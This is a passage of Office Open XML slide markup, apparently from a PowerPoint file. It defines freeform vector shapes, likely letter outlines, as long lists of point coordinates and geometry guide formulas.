                    <a:lnTo>
                      <a:pt x="12" y="4"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="12" y="4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2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32" y="0"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="32" y="0"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="63" y="0"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="63" y="0"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="73" y="0"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="83" y="1"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="92" y="4"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="102" y="8"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="102" y="8"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="106" y="12"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="111" y="18"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="113" y="25"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="115" y="34"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="115" y="34"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="115" y="39"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="113" y="45"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="108" y="55"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="100" y="66"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="87" y="77"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="87" y="77"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="112" y="106"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="132" y="128"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="132" y="128"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="139" y="134"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="145" y="138"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="149" y="139"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="153" y="141"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="153" y="141"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="157" y="141"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="157" y="141"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="160" y="142"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="160" y="143"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="160" y="143"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="158" y="145"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="156" y="145"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="137" y="145"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="137" y="145"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="124" y="145"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="115" y="142"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="115" y="142"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="110" y="137"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="103" y="131"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="88" y="113"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="88" y="113"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="69" y="87"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="69" y="87"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="67" y="85"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="66" y="85"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="48" y="85"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="48" y="85"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="46" y="85"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="46" y="87"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="46" y="89"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="46" y="89"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="46" y="113"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="48" y="130"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="48" y="130"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="48" y="134"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="49" y="137"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="52" y="139"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="56" y="141"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="56" y="141"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="65" y="141"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="65" y="141"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="66" y="142"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="67" y="143"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="67" y="143"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="66" y="145"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="63" y="145"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="63" y="145"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="32" y="145"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="32" y="145"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="8" y="145"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="8" y="145"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="4" y="145"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="4" y="143"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="4" y="143"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="4" y="142"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="7" y="141"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="7" y="141"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="13" y="141"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="13" y="141"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="16" y="139"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="19" y="137"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="20" y="130"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="20" y="130"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="21" y="113"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="21" y="89"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="21" y="55"/>
                    </a:lnTo>
                    <a:close/>
                    <a:moveTo>
                      <a:pt x="46" y="71"/>
                    </a:moveTo>
                    <a:lnTo>
                      <a:pt x="46" y="71"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="46" y="72"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="48" y="74"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="48" y="74"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="56" y="75"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="63" y="75"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="63" y="75"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="71" y="75"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="77" y="72"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="77" y="72"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="82" y="68"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="86" y="63"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="88" y="54"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="90" y="43"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="90" y="43"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="90" y="34"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="87" y="27"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="83" y="21"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="79" y="17"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="74" y="13"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="70" y="12"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="65" y="10"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="60" y="9"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="60" y="9"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="48" y="10"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="48" y="10"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="46" y="12"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="46" y="13"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="46" y="7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5" name="Freeform 138">
                <a:extLst>
                  <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                    <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{AFDED753-3E4E-42C8-9E22-28637E674F21}"/>
                  </a:ext>
                </a:extLst>
              </p:cNvPr>
              <p:cNvSpPr>
                <a:spLocks/>
              </p:cNvSpPr>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr bwMode="black">
              <a:xfrm>
                <a:off x="4620449" y="2163595"/>
                <a:ext cx="91049" cy="127125"/>
              </a:xfrm>
              <a:custGeom>
                <a:avLst/>
                <a:gdLst>
                  <a:gd name="T0" fmla="*/ 20 w 106"/>
                  <a:gd name="T1" fmla="*/ 16 h 148"/>
                  <a:gd name="T2" fmla="*/ 17 w 106"/>
                  <a:gd name="T3" fmla="*/ 10 h 148"/>
                  <a:gd name="T4" fmla="*/ 11 w 106"/>
                  <a:gd name="T5" fmla="*/ 6 h 148"/>
                  <a:gd name="T6" fmla="*/ 0 w 106"/>
                  <a:gd name="T7" fmla="*/ 4 h 148"/>
                  <a:gd name="T8" fmla="*/ 0 w 106"/>
                  <a:gd name="T9" fmla="*/ 2 h 148"/>
                  <a:gd name="T10" fmla="*/ 33 w 106"/>
                  <a:gd name="T11" fmla="*/ 2 h 148"/>
                  <a:gd name="T12" fmla="*/ 87 w 106"/>
                  <a:gd name="T13" fmla="*/ 2 h 148"/>
                  <a:gd name="T14" fmla="*/ 99 w 106"/>
                  <a:gd name="T15" fmla="*/ 0 h 148"/>
                  <a:gd name="T16" fmla="*/ 100 w 106"/>
                  <a:gd name="T17" fmla="*/ 2 h 148"/>
                  <a:gd name="T18" fmla="*/ 99 w 106"/>
                  <a:gd name="T19" fmla="*/ 14 h 148"/>
                  <a:gd name="T20" fmla="*/ 98 w 106"/>
                  <a:gd name="T21" fmla="*/ 27 h 148"/>
                  <a:gd name="T22" fmla="*/ 95 w 106"/>
                  <a:gd name="T23" fmla="*/ 31 h 148"/>
                  <a:gd name="T24" fmla="*/ 94 w 106"/>
                  <a:gd name="T25" fmla="*/ 28 h 148"/>
                  <a:gd name="T26" fmla="*/ 93 w 106"/>
                  <a:gd name="T27" fmla="*/ 20 h 148"/>
                  <a:gd name="T28" fmla="*/ 86 w 106"/>
                  <a:gd name="T29" fmla="*/ 15 h 148"/>
                  <a:gd name="T30" fmla="*/ 48 w 106"/>
                  <a:gd name="T31" fmla="*/ 12 h 148"/>
                  <a:gd name="T32" fmla="*/ 46 w 106"/>
                  <a:gd name="T33" fmla="*/ 15 h 148"/>
                  <a:gd name="T34" fmla="*/ 46 w 106"/>
                  <a:gd name="T35" fmla="*/ 64 h 148"/>
                  <a:gd name="T36" fmla="*/ 83 w 106"/>
                  <a:gd name="T37" fmla="*/ 64 h 148"/>
                  <a:gd name="T38" fmla="*/ 93 w 106"/>
                  <a:gd name="T39" fmla="*/ 61 h 148"/>
                  <a:gd name="T40" fmla="*/ 95 w 106"/>
                  <a:gd name="T41" fmla="*/ 58 h 148"/>
                  <a:gd name="T42" fmla="*/ 98 w 106"/>
                  <a:gd name="T43" fmla="*/ 60 h 148"/>
                  <a:gd name="T44" fmla="*/ 95 w 106"/>
                  <a:gd name="T45" fmla="*/ 74 h 148"/>
                  <a:gd name="T46" fmla="*/ 94 w 106"/>
                  <a:gd name="T47" fmla="*/ 90 h 148"/>
                  <a:gd name="T48" fmla="*/ 93 w 106"/>
                  <a:gd name="T49" fmla="*/ 91 h 148"/>
                  <a:gd name="T50" fmla="*/ 91 w 106"/>
                  <a:gd name="T51" fmla="*/ 90 h 148"/>
                  <a:gd name="T52" fmla="*/ 89 w 106"/>
                  <a:gd name="T53" fmla="*/ 81 h 148"/>
                  <a:gd name="T54" fmla="*/ 79 w 106"/>
                  <a:gd name="T55" fmla="*/ 76 h 148"/>
                  <a:gd name="T56" fmla="*/ 48 w 106"/>
                  <a:gd name="T57" fmla="*/ 74 h 148"/>
                  <a:gd name="T58" fmla="*/ 46 w 106"/>
                  <a:gd name="T59" fmla="*/ 91 h 148"/>
                  <a:gd name="T60" fmla="*/ 46 w 106"/>
                  <a:gd name="T61" fmla="*/ 120 h 148"/>
                  <a:gd name="T62" fmla="*/ 50 w 106"/>
                  <a:gd name="T63" fmla="*/ 131 h 148"/>
                  <a:gd name="T64" fmla="*/ 61 w 106"/>
                  <a:gd name="T65" fmla="*/ 136 h 148"/>
                  <a:gd name="T66" fmla="*/ 83 w 106"/>
                  <a:gd name="T67" fmla="*/ 136 h 148"/>
                  <a:gd name="T68" fmla="*/ 93 w 106"/>
                  <a:gd name="T69" fmla="*/ 133 h 148"/>
                  <a:gd name="T70" fmla="*/ 100 w 106"/>
                  <a:gd name="T71" fmla="*/ 126 h 148"/>
                  <a:gd name="T72" fmla="*/ 102 w 106"/>
                  <a:gd name="T73" fmla="*/ 118 h 148"/>
                  <a:gd name="T74" fmla="*/ 104 w 106"/>
                  <a:gd name="T75" fmla="*/ 118 h 148"/>
                  <a:gd name="T76" fmla="*/ 106 w 106"/>
                  <a:gd name="T77" fmla="*/ 122 h 148"/>
                  <a:gd name="T78" fmla="*/ 102 w 106"/>
                  <a:gd name="T79" fmla="*/ 143 h 148"/>
                  <a:gd name="T80" fmla="*/ 91 w 106"/>
                  <a:gd name="T81" fmla="*/ 148 h 148"/>
                  <a:gd name="T82" fmla="*/ 56 w 106"/>
                  <a:gd name="T83" fmla="*/ 147 h 148"/>
                  <a:gd name="T84" fmla="*/ 20 w 106"/>
                  <a:gd name="T85" fmla="*/ 147 h 148"/>
                  <a:gd name="T86" fmla="*/ 7 w 106"/>
                  <a:gd name="T87" fmla="*/ 147 h 148"/>
                  <a:gd name="T88" fmla="*/ 3 w 106"/>
                  <a:gd name="T89" fmla="*/ 145 h 148"/>
                  <a:gd name="T90" fmla="*/ 6 w 106"/>
                  <a:gd name="T91" fmla="*/ 143 h 148"/>
                  <a:gd name="T92" fmla="*/ 16 w 106"/>
                  <a:gd name="T93" fmla="*/ 141 h 148"/>
                  <a:gd name="T94" fmla="*/ 19 w 106"/>
                  <a:gd name="T95" fmla="*/ 132 h 148"/>
                  <a:gd name="T96" fmla="*/ 20 w 106"/>
                  <a:gd name="T97" fmla="*/ 57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06" h="148">
                    <a:moveTo>
                      <a:pt x="20" y="57"/>
                    </a:moveTo>
                    <a:lnTo>
                      <a:pt x="20" y="57"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="20" y="16"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="20" y="16"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="19" y="12"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="17" y="10"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="15" y="7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87" y="2"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="87" y="2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9" y="0"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="99" y="0"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="100" y="0"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="100" y="2"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="100" y="2"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="99" y="6"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="99" y="14"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="99" y="14"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="98" y="27"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="98" y="27"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="96" y="29"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="95" y="31"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="95" y="31"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="94" y="29"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="94" y="28"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="94" y="28"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="94" y="24"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="93" y="20"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="93" y="20"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="91" y="18"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="89" y="16"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="86" y="15"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="79" y="14"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="79" y="14"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="48" y="12"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="48" y="12"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="46" y="14"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="46" y="15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6" y="64"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="48" y="64"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="48" y="64"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="83" y="64"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="83" y="64"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="89" y="62"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="93" y="61"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="93" y="61"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="94" y="58"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="95" y="58"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="95" y="58"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="96" y="58"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="98" y="60"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="98" y="60"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="95" y="74"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="95" y="74"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="95" y="87"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="95" y="87"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="94" y="90"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="94" y="91"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="93" y="91"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="93" y="91"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="91" y="91"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="91" y="90"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="91" y="90"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="90" y="83"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="90" y="83"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="89" y="81"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="87" y="78"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="83" y="77"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="79" y="76"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="79" y="76"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="48" y="74"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="48" y="74"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="46" y="76"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="46" y="77"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="46" y="91"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="46" y="91"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="46" y="120"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="46" y="120"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="48" y="126"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="48" y="128"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="50" y="131"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="53" y="133"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="56" y="135"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="61" y="136"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="74" y="136"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="74" y="136"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="83" y="136"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="89" y="135"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="93" y="133"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="93" y="133"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="95" y="132"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="98" y="130"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="100" y="126"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="100" y="120"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="100" y="120"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="102" y="118"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="103" y="116"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="103" y="116"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="104" y="118"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="104" y="119"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="106" y="122"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="106" y="122"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="104" y="132"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="102" y="143"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="102" y="143"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="102" y="145"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="99" y="147"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="91" y="148"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="91" y="148"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="56" y="147"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="56" y="147"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="32" y="147"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="32" y="147"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="20" y="147"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="20" y="147"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="7" y="147"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="7" y="147"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="4" y="147"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="3" y="145"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="3" y="145"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="3" y="144"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="6" y="143"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="6" y="143"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="13" y="143"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="13" y="143"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="16" y="141"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="17" y="139"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="19" y="132"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="19" y="132"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="20" y="115"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="20" y="91"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="20" y="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6" name="Freeform 139">
                <a:extLst>
                  <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                    <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{CA77A9B8-27E1-4A5F-A452-7319EEC8487C}"/>
                  </a:ext>
                </a:extLst>
              </p:cNvPr>
              <p:cNvSpPr>
                <a:spLocks/>
              </p:cNvSpPr>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr bwMode="black">
              <a:xfrm>
                <a:off x="4723524" y="2162736"/>
                <a:ext cx="77306" cy="128843"/>
              </a:xfrm>
              <a:custGeom>
                <a:avLst/>
                <a:gdLst>
                  <a:gd name="T0" fmla="*/ 4 w 90"/>
                  <a:gd name="T1" fmla="*/ 146 h 150"/>
                  <a:gd name="T2" fmla="*/ 0 w 90"/>
                  <a:gd name="T3" fmla="*/ 140 h 150"/>
                  <a:gd name="T4" fmla="*/ 1 w 90"/>
                  <a:gd name="T5" fmla="*/ 113 h 150"/>
                  <a:gd name="T6" fmla="*/ 1 w 90"/>
                  <a:gd name="T7" fmla="*/ 109 h 150"/>
                  <a:gd name="T8" fmla="*/ 3 w 90"/>
                  <a:gd name="T9" fmla="*/ 108 h 150"/>
                  <a:gd name="T10" fmla="*/ 5 w 90"/>
                  <a:gd name="T11" fmla="*/ 112 h 150"/>
                  <a:gd name="T12" fmla="*/ 7 w 90"/>
                  <a:gd name="T13" fmla="*/ 121 h 150"/>
                  <a:gd name="T14" fmla="*/ 9 w 90"/>
                  <a:gd name="T15" fmla="*/ 127 h 150"/>
                  <a:gd name="T16" fmla="*/ 16 w 90"/>
                  <a:gd name="T17" fmla="*/ 134 h 150"/>
                  <a:gd name="T18" fmla="*/ 29 w 90"/>
                  <a:gd name="T19" fmla="*/ 140 h 150"/>
                  <a:gd name="T20" fmla="*/ 38 w 90"/>
                  <a:gd name="T21" fmla="*/ 141 h 150"/>
                  <a:gd name="T22" fmla="*/ 50 w 90"/>
                  <a:gd name="T23" fmla="*/ 138 h 150"/>
                  <a:gd name="T24" fmla="*/ 59 w 90"/>
                  <a:gd name="T25" fmla="*/ 133 h 150"/>
                  <a:gd name="T26" fmla="*/ 65 w 90"/>
                  <a:gd name="T27" fmla="*/ 125 h 150"/>
                  <a:gd name="T28" fmla="*/ 66 w 90"/>
                  <a:gd name="T29" fmla="*/ 116 h 150"/>
                  <a:gd name="T30" fmla="*/ 66 w 90"/>
                  <a:gd name="T31" fmla="*/ 109 h 150"/>
                  <a:gd name="T32" fmla="*/ 58 w 90"/>
                  <a:gd name="T33" fmla="*/ 96 h 150"/>
                  <a:gd name="T34" fmla="*/ 36 w 90"/>
                  <a:gd name="T35" fmla="*/ 82 h 150"/>
                  <a:gd name="T36" fmla="*/ 20 w 90"/>
                  <a:gd name="T37" fmla="*/ 73 h 150"/>
                  <a:gd name="T38" fmla="*/ 11 w 90"/>
                  <a:gd name="T39" fmla="*/ 62 h 150"/>
                  <a:gd name="T40" fmla="*/ 5 w 90"/>
                  <a:gd name="T41" fmla="*/ 50 h 150"/>
                  <a:gd name="T42" fmla="*/ 4 w 90"/>
                  <a:gd name="T43" fmla="*/ 38 h 150"/>
                  <a:gd name="T44" fmla="*/ 5 w 90"/>
                  <a:gd name="T45" fmla="*/ 30 h 150"/>
                  <a:gd name="T46" fmla="*/ 13 w 90"/>
                  <a:gd name="T47" fmla="*/ 16 h 150"/>
                  <a:gd name="T48" fmla="*/ 27 w 90"/>
                  <a:gd name="T49" fmla="*/ 5 h 150"/>
                  <a:gd name="T50" fmla="*/ 45 w 90"/>
                  <a:gd name="T51" fmla="*/ 0 h 150"/>
                  <a:gd name="T52" fmla="*/ 54 w 90"/>
